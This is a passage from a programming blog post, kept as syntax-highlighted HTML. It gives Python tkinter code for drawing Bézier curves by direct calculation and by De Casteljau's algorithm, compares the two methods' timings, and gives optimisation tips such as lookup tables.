            <span class="bp">self</span><span class="o">.</span><span class="n">plot_pixel</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">y</span><span class="p">))</span>
            <span class="n">t</span> <span class="o">+=</span> <span class="mf">0.001</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">master</span> <span class="o">=</span> <span class="n">tkinter</span><span class="o">.</span><span class="n">Tk</span><span class="p">()</span>
    <span class="n">w</span> <span class="o">=</span> <span class="n">Bezier</span><span class="p">(</span><span class="n">master</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span> <span class="n">height</span><span class="o">=</span><span class="mi">1000</span><span class="p">)</span>
    <span class="n">w</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>

    <span class="c"># Finally draw some Bézier curves :)</span>
    <span class="c">#w.draw_quadratic_bez((70, 250), (62, 59), (250, 61))</span>
    <span class="c">#w.draw_quadratic_bez((170,77), (162, 159), (210, 161))</span>
    <span class="n">w</span><span class="o">.</span><span class="n">draw_quadratic_bez</span><span class="p">((</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">),</span> <span class="p">(</span><span class="mi">162</span><span class="p">,</span> <span class="mi">89</span><span class="p">),</span> <span class="p">(</span><span class="mi">250</span><span class="p">,</span> <span class="mi">61</span><span class="p">))</span>
    <span class="c">#w.draw_cubic_bez((120, 160), (35, 200), (153, 268), (165, 70))</span>
    <span class="n">tkinter</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>
</pre></div>


<p>And now De Casteljau’s algorithm. It's not limited to quadratic and
cubic Bézier curves, on the contrary, you are free to plot curves of any
degree n. Just give it a try!</p>
<div class="highlight"><pre><span class="kn">import</span> <span class="nn">tkinter</span>

<span class="k">class</span> <span class="nc">InvalidInputError</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
    <span class="k">pass</span>

<span class="k">class</span> <span class="nc">Casteljau</span><span class="p">(</span><span class="n">tkinter</span><span class="o">.</span><span class="n">Canvas</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Implementation of de Casteljau&#39;s algorithm for drawing Bézier curves.</span>
<span class="sd">    Implemented along the submittal of http://pomax.github.io/bezierinfo/#control.</span>
<span class="sd">    Author: Nikolai Tschacher</span>
<span class="sd">    Date: 07.10.2013</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="c"># Because Canvas doesn&#39;t support simple pixel plotting,</span>
    <span class="c"># we need to help us out with a line with length 1 in</span>
    <span class="c"># positive x direction.</span>
    <span class="k">def</span> <span class="nf">plot_pixel</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x0</span><span class="p">,</span> <span class="n">y0</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">create_line</span><span class="p">(</span><span class="n">x0</span><span class="p">,</span> <span class="n">y0</span><span class="p">,</span> <span class="n">x0</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">y0</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">draw_curve</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">points</span><span class="p">,</span> <span class="n">t</span><span class="p">):</span>
        <span class="c"># Check that input parameters are valid. We don&#39;t check wheter </span>
        <span class="c"># the elements in the tuples are of type int or float.</span>
        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">points</span><span class="p">:</span>
            <span class="k">if</span> <span class="p">(</span><span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">):</span>
                <span class="k">raise</span> <span class="n">InvalidInputError</span><span class="p">(</span><span class="s">&#39;points is not a list of points(tuples)&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">points</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">plot_pixel</span><span class="p">(</span><span class="n">points</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">points</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">newpoints</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">points</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
                <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">t</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
                <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">t</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">newpoints</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">draw_curve</span><span class="p">(</span><span class="n">newpoints</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>

    <span class="c"># Use De Casteljau&#39;s algorithm with recursion eliminated, but the same</span>
    <span class="c"># geometrical approach. Idea: Eliminate the expensive stack frame generation</span>
    <span class="c"># that recursion comes with. Only quadratical Bézier curves.</span>
    <span class="k">def</span> <span class="nf">draw_point2</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">points</span><span class="p">,</span> <span class="n">t</span><span class="p">):</span>
        <span class="c"># Vector addition of P0+P1</span>
        <span class="n">q0_x</span><span class="p">,</span> <span class="n">q0_y</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">t</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span>
                        <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">t</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
        <span class="n">q1_x</span><span class="p">,</span> <span class="n">q1_y</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">t</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span>
                        <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">t</span> <span class="o">*</span> <span class="n">points</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>

        <span class="n">b_x</span><span class="p">,</span> <span class="n">b_y</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">*</span><span class="n">q0_x</span> <span class="o">+</span> <span class="n">t</span><span class="o">*</span><span class="n">q1_x</span><span class="p">,</span> <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">*</span><span class="n">q0_y</span> <span class="o">+</span> <span class="n">t</span><span class="o">*</span><span class="n">q1_y</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">plot_pixel</span><span class="p">(</span><span class="n">b_x</span><span class="p">,</span> <span class="n">b_y</span><span class="p">)</span>

    <span class="c"># Usage function for the algorithm.</span>
    <span class="k">def</span> <span class="nf">draw</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">points</span><span class="p">):</span>
        <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">t</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">draw_curve</span><span class="p">(</span><span class="n">points</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
            <span class="n">t</span> <span class="o">+=</span> <span class="mf">0.001</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">master</span> <span class="o">=</span> <span class="n">tkinter</span><span class="o">.</span><span class="n">Tk</span><span class="p">()</span>
    <span class="n">w</span> <span class="o">=</span> <span class="n">Casteljau</span><span class="p">(</span><span class="n">master</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span> <span class="n">height</span><span class="o">=</span><span class="mi">1000</span><span class="p">)</span>
    <span class="n">w</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>

    <span class="c"># Finally draw some Bézier curves :)</span>
    <span class="n">w</span><span class="o">.</span><span class="n">draw</span><span class="p">([(</span><span class="mi">70</span><span class="p">,</span> <span class="mi">250</span><span class="p">),</span> <span class="p">(</span><span class="mi">462</span><span class="p">,</span> <span class="mi">159</span><span class="p">),</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)])</span>
    <span class="c">#w.draw([(133, 267), (121, 28), (198, 270), (210, 29)])</span>
    <span class="n">tkinter</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>
</pre></div>


<p>And finally the performance comparison between the two algorithms. The
direct approach wins over De Casteljau’s algorithm (I guess because
recursion is such a slowpoke), but on the other side, De Casteljau's
method is numerically stable. The direct approach is a little more than
twice as fast (This might not be accurate, since Python isn't really the
language you use for such stuff and additionally my implementation is
certainly not good enough such that I can say that any De Casteljau
algorithm implementation is exactly twice as slow as the direct
approach. These comparisons are rather a rough estimation)! Note that
the initial type checks in draw_curve() in class Casteljau were
disabled while testing the speed to avoid contortions. Furthermore, I've
shamelessly stolen the timing method from <a href="http://preshing.com/20110924/timing-your-code-using-pythons-with-statement/">this
site</a>,
using the following little class to time within <em>with</em> statements:</p>
<div class="highlight"><pre><span class="kn">import</span> <span class="nn">time</span>

<span class="k">class</span> <span class="nc">Timer</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s">&#39;&#39;</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">verbose</span> <span class="o">=</span> <span class="n">verbose</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span>

    <span class="k">def</span> <span class="nf">__enter__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">self</span>

    <span class="k">def</span> <span class="nf">__exit__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">secs</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">start</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">msecs</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">secs</span> <span class="o">*</span> <span class="mi">1000</span>  <span class="c"># millisecs</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">verbose</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">&#39;[!] </span><span class="si">%s</span><span class="s"> - elapsed time: </span><span class="si">%f</span><span class="s"> ms&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">msg</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">msecs</span><span class="p">))</span>
</pre></div>


<p>Eventually the source code for the performance tests. Please consider
that it might be hard to reproduce the exact same results as below,
since the code in the github repo evolves over time:</p>
<div class="highlight"><pre><span class="kn">from</span> <span class="nn">timer</span> <span class="kn">import</span> <span class="n">Timer</span>
<span class="kn">from</span> <span class="nn">bezier</span> <span class="kn">import</span> <span class="n">Bezier</span> <span class="c"># Simple bezier drawing algorithm directly derived from calculus.</span>
<span class="kn">from</span> <span class="nn">casteljau</span> <span class="kn">import</span> <span class="n">Casteljau</span> <span class="c"># Drawing curves using de Casteljau&#39;s algorithm.</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="c"># Overwrite Bezier class and Casteljau class to disable the GUI functions. We just want to </span>
<span class="c"># mesure the algorithm&#39;s performance not the graphical toolkit overhead...</span>

<span class="c"># Pre calculate random points for quadratic and cubic Bézier simulation for</span>
<span class="c"># performance tests.</span>
<span class="n">NUMBER_OF_CURVES</span> <span class="o">=</span> <span class="mi">500</span>

<span class="n">R</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randrange</span>
<span class="n">pp</span> <span class="o">=</span> <span class="p">[[(</span><span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span> <span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">)),</span> <span class="p">(</span><span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span> <span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">)),</span> <span class="p">(</span><span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span> <span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">))]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">NUMBER_OF_CURVES</span><span class="p">)]</span>
<span class="n">pp4</span> <span class="o">=</span> <span class="p">[[(</span><span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span> <span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">)),</span> <span class="p">(</span><span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span> <span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">)),</span> <span class="p">(</span><span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span> <span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">)),</span> <span class="p">(</span><span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span> <span class="n">R</span><span class="p">(</span><span class="mi">500</span><span class="p">))]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">NUMBER_OF_CURVES</span><span class="p">)]</span>

<span class="k">class</span> <span class="nc">BezierPerf</span><span class="p">(</span><span class="n">Bezier</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">test1</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">test2</span><span class="p">()</span>
    <span class="k">def</span> <span class="nf">plot_pixel</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x0</span><span class="p">,</span> <span class="n">y0</span><span class="p">):</span>
        <span class="k">pass</span> <span class="c"># Nothin here oO</span>
    <span class="k">def</span> <span class="nf">test1</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">with</span> <span class="n">Timer</span><span class="p">(</span><span class="s">&#39;Testing quadratic bezier with direct approach&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">t</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">points</span> <span class="ow">in</span> <span class="n">pp</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">draw_quadratic_bez</span><span class="p">(</span><span class="n">points</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">points</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">points</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="k">def</span> <span class="nf">test2</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">with</span> <span class="n">Timer</span><span class="p">(</span><span class="s">&#39;Testing cubic curves with direct approach&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">t</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">points</span> <span class="ow">in</span> <span class="n">pp4</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">draw_cubic_bez</span><span class="p">(</span><span class="n">points</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">points</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">points</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">points</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>


<span class="k">class</span> <span class="nc">CasteljauPerf</span><span class="p">(</span><span class="n">Casteljau</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">test1</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">test2</span><span class="p">()</span>
    <span class="k">def</span> <span class="nf">plot_pixel</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x0</span><span class="p">,</span> <span class="n">y0</span><span class="p">):</span>
        <span class="k">pass</span> <span class="c"># No drawing please.</span>
    <span class="k">def</span> <span class="nf">test1</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">with</span> <span class="n">Timer</span><span class="p">(</span><span class="s">&#39;Testing quadratic bezier curves with De Casteljau&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">t</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">points</span> <span class="ow">in</span> <span class="n">pp</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">draw</span><span class="p">(</span><span class="n">points</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">test2</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">with</span> <span class="n">Timer</span><span class="p">(</span><span class="s">&#39;Testing cubic bezier curves with De Casteljau&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">t</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">points</span> <span class="ow">in</span> <span class="n">pp4</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">draw</span><span class="p">(</span><span class="n">points</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">test2</span> <span class="o">=</span> <span class="n">CasteljauPerf</span><span class="p">()</span>
    <span class="n">test</span> <span class="o">=</span> <span class="n">BezierPerf</span><span class="p">()</span>
</pre></div>


<p>The above timing yields this output:  </p>
<p><code>[nikolai@niko-arch python_tests]$ python performance_tests.py [!] Testing quadratic bezier curves with De Casteljau - elapsed time: 5814.155579 ms [!] Testing cubic bezier curves with De Casteljau - elapsed time: 9396.822453 ms [!] Testing quadratic bezier with direct approach - elapsed time: 1528.661489 ms [!] Testing cubic curves with direct approach - elapsed time: 2135.466337 ms</code></p>
<h3>Optimizing</h3>
<p>When it comes to optimization, one can go almost infinitely deep and
far. There's a huge amount of scientific research and work invested,
because saving CPU power means saving money. For instance, in compiler
development, the optimization part constitutes the most complex and
work-intense part (If I remember my coursera lessons correctly). I
instead will only scratch on the surface and won't dive into the depths
of optimizing (Well these metaphors combined is utterly strange ;))<br />
I will tune the direct algorithm, because it is just faster then De
Casteljau's recursive approach.</p>
<p>Some concepts (and common sense):</p>
<ul>
<li><em>Avoid double calculations.</em> Have a look at the Code above (or <a href="https://github.com/NikolaiT/CunningCaptcha/blob/master/python_tests/bezier.py">on
    github</a>).
    The functions <code>quadratic_bezier_sum</code> and <code>cubic_bezier_sum</code> are
    called twice for the x and the y coordinate. But this means that the
    coefficients of the equation are also calculated twice, although we
    could just compute them once and reuse them for the other
    coordinates (In our case just for the y coordinate). Eliminate this
    problem through incorporating the function's logic directly into the
    calle's context, namely into the methods
    <code>draw_(quadratic|cubic)_bezier_sum</code>. This brings us directly to the
    second point...</li>
<li>
<p><em>Spare on function calls.</em> Function calls are a nice way to separate
    concepts logically and organize your code (structural/imperative
    programming) but you should't use them excessively in time critical
    code. But why? Function calls mean new call stacks. And each
    operation in the ram/stack is at least 100 times slower than using
    CPU registers directly. This is also the reason why recursion is so
    inefficient (Recursion=many many stack frames). To readopt the
    example above: When we integrate the functions
    quadratic_bezier_sum and <code>cubic_bezier_sum</code> into the calling
    functions we eliminate exactly 1000 functions calls (Assuming we
    increase the parameter t in each loop by 0.001). Further, this means
    we spare 500'000 function calls when we draw 500 splines. So
    remember: Don't implement too many function calls inside the body of
    the loops. You can examine the updated function called
    <code>_draw_(quadratic|cubic)_bez</code> on github
    <a href="https://github.com/NikolaiT/CunningCaptcha/blob/master/python_tests/geoprim.py">here</a>
    The preliminary and this aspect together brings us the following
    performance boost over the inefficient code at the start of this
    post:  </p>
<p><code>[+] Testing task is to draw 500 randomly generated Bézier splines with different algorithms. Approximation uses 20 segments. [!] Testing unoptimized quadratic bezier with direct approach - elapsed time: 2512.458563 ms [!] Testing unoptimized cubic curves with direct approach - elapsed time: 3192.077160 ms [!] Testing quadratic bezier curves with direct approach - elapsed time: 2277.250528 ms [!] Testing cubic bezier curves with direct approach - elapsed time: 2857.527494 ms</code><br />
That's after all a 11% performance increase! Not bad for a start :)
-   <em>Be aware of multiplications/divisions.</em>The more operations you can
eliminate, the better. Usually, multiplications are slower than
additions, so you might try to algebraically simplify your
calculations of find other ways to use less arithmetic operations.
In my case there would be a technique called fast forward
differencing with using Taylor series. This technique is especially
nice when you want to speedup the rasterization of big, complex
splines but diminishes when you need to draw many comparable simple
curves, as I do in my font project. Therefore I won't make use of
it. However, if you want to learn it, <a href="http://scratchapixel.com/lessons/3d-basic-lessons/lesson-11-rendering-the-teapot-bezier-surfaces/fast-forward-differencing/">here you
go.</a>
-   <em>Precalculate stuff</em> Just use look-up tables. Especially in my case,
look-up tables will help to speed up the algorithms a great deal.
This means, I will precompute all coefficients for the Bézier
splines (3 coefficients in case of quadratic splines, 4 in case of
cubic curves). Suppose I am going too draw 500 cubic Bézier curves,
and each curve consists of 1000 points. Accordingly the algorithm
will calculate a matrix of 1000 entries and each entry consists of
the 4 coefficients (3 respectively when plotting quadratic splines).
That's around <code>4*8*1000=32kb</code> of data of RAM too hold all possible
coefficients, not really much on a average 6-8 GB built-in RAM
nowadays ;). Here is the relevant code excerpt that shows the
generation of the look-up table:</p>
<div class="highlight"><pre><span class="k">def</span> <span class="nf">_quadratic_bez_lut</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">_LUT_Q</span><span class="p">:</span>
        <span class="c">#print(&#39;[i] lut generating for quadratic splines...&#39;)</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">t</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">):</span>
            <span class="n">t2</span> <span class="o">=</span> <span class="n">t</span><span class="o">*</span><span class="n">t</span>
            <span class="n">mt</span> <span class="o">=</span> <span class="mi">1</span><span class="o">-</span><span class="n">t</span>
            <span class="n">mt2</span> <span class="o">=</span> <span class="n">mt</span><span class="o">*</span><span class="n">mt</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">_LUT_Q</span><span class="p">[</span><span class="n">t</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">mt2</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="n">mt</span><span class="o">*</span><span class="n">t</span><span class="p">,</span> <span class="n">t2</span><span class="p">)</span>
            <span class="n">t</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_STEP</span>

    <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_LUT_Q</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
        <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">p2</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">p3</span><span class="o">.</span><span class="n">x</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">p2</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">p3</span><span class="o">.</span><span class="n">y</span><span class="o">*</span><span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_plot_pixel</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">_cubic_bez_lut</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span><span class="p">,</span> <span class="n">p4</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">_LUT_C</span><span class="p">:</span>
        <span class="c">#print(&#39;[i] lut generating for cubic splines...&#39;)</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">t</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">):</span>
            <span class="n">t2</span> <span class="o">=</span> <span class="n">t</span><span class="o">*</span><span class="n">t</span>
            <span class="n">t3</span> <span class="o">=</span> <span class="n">t2</span><span class="o">*</span><span class="n">t</span>
            <span class="n">mt</span> <span class="o">=</span> <span class="mi">1</span><span class="o">-</span><span class="n">t</span>
            <span class="n">mt2</span> <span class="o">=</span> <span class="n">mt</span><span class="o">*</span><span class="n">mt</span>
            <span class="n">mt3</span> <span class="o">=</span> <span class="n">mt2</span><span class="o">*</span><span class="n">mt</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">_LUT_C</span><span class="p">[</span><span class="n">t</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">mt3</span><span class="p">,</span> <span class="mi">3</span><span class="o">*</span><span class="n">mt2</span><span class="o">*</span><span class="n">t</span><span class="p">,</span> <span class="mi">3</span><span class="o">*</span><span class="n">mt</span><span class="o">*</span><span class="n">t2</span><span class="p">,</span> <span class="n">t3</span><span class="p">)</span>
            <span class="n">t</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_STEP</span>

    <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_LUT_C</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
